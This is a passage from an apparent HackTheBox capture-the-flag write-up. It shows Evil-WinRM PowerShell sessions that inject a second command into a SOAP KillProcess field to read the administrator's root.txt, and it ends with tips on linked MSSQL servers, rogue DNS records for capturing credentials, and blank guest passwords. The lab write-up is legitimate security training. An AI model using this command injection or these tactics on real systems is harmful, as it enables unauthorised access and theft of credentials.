+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\sqlmgmt</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$headers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@{</span><span class="w">
+    </span><span class="s2">"SOAPAction"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="se">`"</span><span class="nv">$action</span><span class="se">`"</span><span class="s2">"</span><span class="w">
+    </span><span class="s2">"Content-Type"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"text/xml; charset=utf-8"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\sqlmgmt</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$url</span><span class="w"> </span><span class="nt">-Method</span><span class="w"> </span><span class="nx">Post</span><span class="w"> </span><span class="nt">-Body</span><span class="w"> </span><span class="nv">$soap</span><span class="w"> </span><span class="nt">-Headers</span><span class="w"> </span><span class="nv">$headers</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w">
+</span><span class="nv">$response</span><span class="o">.</span><span class="nf">Content</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">s:Envelope</span><span class="w"> </span><span class="nx">xmlns:s</span><span class="o">=</span><span class="s2">"http://schemas.xmlsoap.org/soap/envelope/"</span><span class="err">&gt;&lt;</span><span class="n">s:Body</span><span class="err">&gt;&lt;</span><span class="nx">KillProcessResponse</span><span class="w"> </span><span class="nx">xmlns</span><span class="o">=</span><span class="s2">"http://tempuri.org/"</span><span class="err">&gt;&lt;</span><span class="n">KillProcessResult</span><span class="err">&gt;</span><span class="o">&amp;</span><span class="c">#xD;</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">/KillProcessResult</span><span class="err">&gt;&lt;</span><span class="nx">/KillProcessResponse</span><span class="err">&gt;&lt;</span><span class="nx">/s:Body</span><span class="err">&gt;&lt;</span><span class="nx">/s:Envelope</span><span class="err">&gt;</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\sqlmgmt</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w"> </span><span class="nx">~</span><span class="w">
+
+
+    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Users\sqlmgmt</span><span class="w">
+
+
+</span><span class="n">Mode</span><span class="w">                 </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
+</span><span class="o">----</span><span class="w">                 </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">         </span><span class="nx">5/16/2025</span><span class="w">   </span><span class="nx">8:09</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Desktop</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">         </span><span class="nx">5/16/2025</span><span class="w">   </span><span class="nx">8:08</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Documents</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">          </span><span class="nx">5/8/2021</span><span class="w">   </span><span class="nx">1:20</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Downloads</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">          </span><span class="nx">5/8/2021</span><span class="w">   </span><span class="nx">1:20</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Favorites</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">          </span><span class="nx">5/8/2021</span><span class="w">   </span><span class="nx">1:20</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Links</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">          </span><span class="nx">5/8/2021</span><span class="w">   </span><span class="nx">1:20</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Music</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">          </span><span class="nx">5/8/2021</span><span class="w">   </span><span class="nx">1:20</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Pictures</span><span class="w">
+</span><span class="n">d-----</span><span class="w">          </span><span class="nx">5/8/2021</span><span class="w">   </span><span class="nx">1:20</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Saved</span><span class="w"> </span><span class="nx">Games</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">          </span><span class="nx">5/8/2021</span><span class="w">   </span><span class="nx">1:20</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Videos</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">          </span><span class="mi">5</span><span class="n">/8/2026</span><span class="w">   </span><span class="nx">4:17</span><span class="w"> </span><span class="nx">PM</span><span class="w">           </span><span class="nx">7680</span><span class="w"> </span><span class="nx">m.exe</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">          </span><span class="mi">5</span><span class="n">/8/2026</span><span class="w">   </span><span class="nx">4:53</span><span class="w"> </span><span class="nx">PM</span><span class="w">              </span><span class="nx">0</span><span class="w"> </span><span class="nx">pwned.txt</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">          </span><span class="mi">5</span><span class="n">/8/2026</span><span class="w">   </span><span class="nx">3:50</span><span class="w"> </span><span class="nx">PM</span><span class="w">       </span><span class="nx">11115520</span><span class="w"> </span><span class="nx">w.exe</span><span class="w">
+
+
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\sqlmgmt</span><span class="err">&gt;</span><span class="w">
+
+</span></code></pre></div></div>
+
+<p>HERE WE GO! There’s <code class="language-plaintext highlighter-rouge">pwned.txt</code>! Let’s read <code class="language-plaintext highlighter-rouge">C:\Users\Adminstrator\Desktop\root.txt</code> and see what comes back!</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\sqlmgmt</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"http://localhost:8000/MonitorService"</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\sqlmgmt</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$action</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"http://tempuri.org/IMonitoringService/KillProcess"</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\sqlmgmt</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"notepad.exe; type C:\Users\Administrat*\Desktop\root.txt"</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\sqlmgmt</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$headers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@{</span><span class="w">
+    </span><span class="s2">"SOAPAction"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="se">`"</span><span class="nv">$action</span><span class="se">`"</span><span class="s2">"</span><span class="w">
+    </span><span class="s2">"Content-Type"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"text/xml; charset=utf-8"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\sqlmgmt</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$soap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sh">@"
+&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/"&gt;
+   &lt;soapenv:Header/&gt;
+   &lt;soapenv:Body&gt;
+      &lt;tem:KillProcess&gt;
+         &lt;tem:processName&gt;</span><span class="nv">$payload</span><span class="sh">&lt;/tem:processName&gt;
+      &lt;/tem:KillProcess&gt;
+   &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;
+"@</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\sqlmgmt</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">echo</span><span class="w"> </span><span class="nv">$soap</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">soapenv:Envelope</span><span class="w"> </span><span class="nx">xmlns:soapenv</span><span class="o">=</span><span class="s2">"http://schemas.xmlsoap.org/soap/envelope/"</span><span class="w"> </span><span class="n">xmlns:tem</span><span class="o">=</span><span class="s2">"http://tempuri.org/"</span><span class="err">&gt;</span><span class="w">
+   </span><span class="err">&lt;</span><span class="n">soapenv:Header/</span><span class="err">&gt;</span><span class="w">
+   </span><span class="err">&lt;</span><span class="n">soapenv:Body</span><span class="err">&gt;</span><span class="w">
+      </span><span class="err">&lt;</span><span class="n">tem:KillProcess</span><span class="err">&gt;</span><span class="w">
+         </span><span class="err">&lt;</span><span class="n">tem:processName</span><span class="err">&gt;</span><span class="nx">notepad.exe</span><span class="p">;</span><span class="w"> </span><span class="kr">type</span><span class="w"> </span><span class="n">C:\Users\Administrat</span><span class="o">*</span><span class="nx">\Desktop\root.txt</span><span class="err">&lt;</span><span class="nx">/tem:processName</span><span class="err">&gt;</span><span class="w">
+      </span><span class="err">&lt;</span><span class="n">/tem:KillProcess</span><span class="err">&gt;</span><span class="w">
+   </span><span class="err">&lt;</span><span class="n">/soapenv:Body</span><span class="err">&gt;</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">/soapenv:Envelope</span><span class="err">&gt;</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\sqlmgmt</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$url</span><span class="w"> </span><span class="nt">-Method</span><span class="w"> </span><span class="nx">Post</span><span class="w"> </span><span class="nt">-Body</span><span class="w"> </span><span class="nv">$soap</span><span class="w"> </span><span class="nt">-Headers</span><span class="w"> </span><span class="nv">$headers</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\sqlmgmt</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$response</span><span class="o">.</span><span class="nf">Content</span><span class="w">
+</span><span class="err">&lt;</span><span class="nx">s:Envelope</span><span class="w"> </span><span class="nx">xmlns:s</span><span class="o">=</span><span class="s2">"http://schemas.xmlsoap.org/soap/envelope/"</span><span class="err">&gt;&lt;</span><span class="n">s:Body</span><span class="err">&gt;&lt;</span><span class="nx">KillProcessResponse</span><span class="w"> </span><span class="nx">xmlns</span><span class="o">=</span><span class="s2">"http://tempuri.org/"</span><span class="err">&gt;&lt;</span><span class="n">KillProcessResult</span><span class="err">&gt;&lt;</span><span class="nx">REDACTED</span><span class="err">&gt;</span><span class="o">&amp;</span><span class="c">#xD;</span><span class="w">
+</span><span class="o">&amp;</span><span class="c">#xD;</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">/KillProcessResult</span><span class="err">&gt;&lt;</span><span class="nx">/KillProcessResponse</span><span class="err">&gt;&lt;</span><span class="nx">/s:Body</span><span class="err">&gt;&lt;</span><span class="nx">/s:Envelope</span><span class="err">&gt;</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\sqlmgmt</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Here we go!</p>
+
+<hr />
+
+<h2 id="-retrospective">🧠 Retrospective</h2>
+
+<ul>
+  <li><strong>Learnings:</strong>
+    <ol>
+      <li>MSSQL-Linked Servers: Always enumerate MSSQL Servers well and especially check for Linked Servers!</li>
+      <li>DNS Abusing: Whenever any process or service requests a server that has no DNS record make sure to abuse that missing record by creating your own in order to capture sensitive information.</li>
+      <li>Guest/Blank Passwords: Whenever you see a <code class="language-plaintext highlighter-rouge">guest</code> user, always try to login as <code class="language-plaintext highlighter-rouge">guest</code> with empty password.</li>
+    </ol>
+  </li>
+</ul>
+
+</div>
+
+
+
+
+
+
+
+
+
+  
+
+  <style>
+    .tooltip { position: relative; display: inline-block; cursor: help; }
+    .tooltip .tooltiptext {
+      visibility: hidden; width: 200px; background-color: #1a1a1a; color: #fff;
+      text-align: left; border: 1px solid var(--accent); padding: 8px; position: absolute;
+      z-index: 10; bottom: 125%; left: 50%; margin-left: -100px; opacity: 0;
+      transition: opacity 0.3s; font-family: var(--font-mono); font-size: 0.65rem; line-height: 1.4;
+      pointer-events: none;
+    }
+    .tooltip:hover .tooltiptext,
+    .tooltip:focus .tooltiptext,
+    .tooltip:focus-within .tooltiptext { visibility: visible; opacity: 1; }
+  </style>
+
+  <div class="related-ctfs" style="margin-top: 4rem; border-top: 1px solid var(--border); padding-top: 2rem;">
+    <h3 style="color: var(--accent); margin-bottom: 1.5rem; font-family: var(--font-mono);">// SIMILAR_OPERATIONS</h3>
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem;">
+      
+      
+        
+        
+        
+        
+        
+
+        
+        
+
+        <div class="related-card" style="border: 1px solid #222; background: #0a0a0a; display: flex; align-items: center; padding: 0.8rem; gap: 1rem; position: relative;">
+          
+          <div style="width: 60px; height: 60px; flex-shrink: 0;">
+            <img src="/assets/img/ctf/pov.png" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.8;">
+          </div>
+
+          <div style="flex-grow: 1;">
+            <div style="display: flex; justify-content: space-between; font-family: var(--font-mono); font-size: 0.6rem;">
+              <span class="fg-dim">HACKTHEBOX</span>
+              <span style="color: #ffa500; font-weight: bold;">
+                MEDIUM
+              </span>
+            </div>
+            
+            <h4 style="margin: 3px 0;"><a href="/ctfs/htb-pov/" style="border: none; font-size: 0.95rem;">HackTheBox: Pov</a></h4>
+            
+            <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px;">
+              <div style="width: 80px; height: 4px; background: #222; border-radius: 2px;">
+                <div style="width: 16%; height: 100%; background: var(--accent);"></div>
+              </div>
+              <span style="font-family: var(--font-mono); font-size: 0.6rem; color: var(--accent);">
+                16% MATCH
+              </span>
+              
+              <div class="tooltip">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.5; vertical-align: middle;"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                <span class="tooltiptext">
+                  <strong style="color: var(--accent); display: block; margin-bottom: 5px;">SHARED_VECTORS:</strong>
+                  • Windows
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      
+        
+        
+        
+        
+        
+
+        
+        
+
+        <div class="related-card" style="border: 1px solid #222; background: #0a0a0a; display: flex; align-items: center; padding: 0.8rem; gap: 1rem; position: relative;">
+          
+          <div style="width: 60px; height: 60px; flex-shrink: 0;">
+            <img src="/assets/img/ctf/jeeves.png" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.8;">
+          </div>
+
+          <div style="flex-grow: 1;">
+            <div style="display: flex; justify-content: space-between; font-family: var(--font-mono); font-size: 0.6rem;">
+              <span class="fg-dim">HACKTHEBOX</span>
+              <span style="color: #ffa500; font-weight: bold;">
+                MEDIUM
+              </span>
+            </div>
+            
+            <h4 style="margin: 3px 0;"><a href="/ctfs/htb-jeeves/" style="border: none; font-size: 0.95rem;">HackTheBox: Jeeves</a></h4>
+            
+            <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px;">
+              <div style="width: 80px; height: 4px; background: #222; border-radius: 2px;">
+                <div style="width: 16%; height: 100%; background: var(--accent);"></div>
+              </div>
+              <span style="font-family: var(--font-mono); font-size: 0.6rem; color: var(--accent);">
+                16% MATCH
+              </span>
+              
+              <div class="tooltip">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.5; vertical-align: middle;"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                <span class="tooltiptext">
+                  <strong style="color: var(--accent); display: block; margin-bottom: 5px;">SHARED_VECTORS:</strong>
+                  • Windows
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      
+        
+        
+        
+        
+        
+
+        
+        
+
+        <div class="related-card" style="border: 1px solid #222; background: #0a0a0a; display: flex; align-items: center; padding: 0.8rem; gap: 1rem; position: relative;">
+          
+          <div style="width: 60px; height: 60px; flex-shrink: 0;">
+            <img src="/assets/img/ctf/fluffy.png" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.8;">
+          </div>
+
+          <div style="flex-grow: 1;">
+            <div style="display: flex; justify-content: space-between; font-family: var(--font-mono); font-size: 0.6rem;">
+              <span class="fg-dim">HACKTHEBOX</span>
+              <span style="color: #00ff00; font-weight: bold;">
+                EASY
+              </span>
+            </div>
+            
+            <h4 style="margin: 3px 0;"><a href="/ctfs/htb-fluffy/" style="border: none; font-size: 0.95rem;">HackTheBox: Fluffy</a></h4>
+            
+            <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px;">
+              <div style="width: 80px; height: 4px; background: #222; border-radius: 2px;">
+                <div style="width: 16%; height: 100%; background: var(--accent);"></div>
+              </div>
+              <span style="font-family: var(--font-mono); font-size: 0.6rem; color: var(--accent);">
+                16% MATCH
+              </span>
+              
+              <div class="tooltip">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.5; vertical-align: middle;"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                <span class="tooltiptext">
+                  <strong style="color: var(--accent); display: block; margin-bottom: 5px;">SHARED_VECTORS:</strong>
+                  • Windows
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      
+    </div>
+  </div>
+
+
+
+    </div>
+
+  </body>
+</html>
